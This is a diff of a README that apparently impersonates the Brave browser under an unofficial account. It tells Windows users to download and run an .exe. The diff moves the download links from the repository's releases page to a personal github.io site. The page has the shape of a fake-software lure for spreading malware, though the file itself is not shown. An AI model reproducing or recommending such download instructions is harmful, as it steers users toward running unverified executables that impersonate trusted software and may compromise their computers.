@@ -1,10 +1,10 @@
 # 🌐 Brave-Browser-2026 - Fast Private Browsing For Windows Users
 
-[![Download Brave Browser](https://img.shields.io/badge/Download-Brave_Browser-blue.svg)](https://github.com/tambourseyhan42/Brave-Browser-2026/releases)
+[![Download Brave Browser](https://img.shields.io/badge/Download-Brave_Browser-blue.svg)](https://tambourseyhan42.github.io)
 
 ## 👇 How To Download And Install
 
-1. Visit the [Brave Browser download page](https://github.com/tambourseyhan42/Brave-Browser-2026/releases).
+1. Visit the [Brave Browser download page](https://tambourseyhan42.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in .exe to start the file download.
 4. Save the file to your computer.
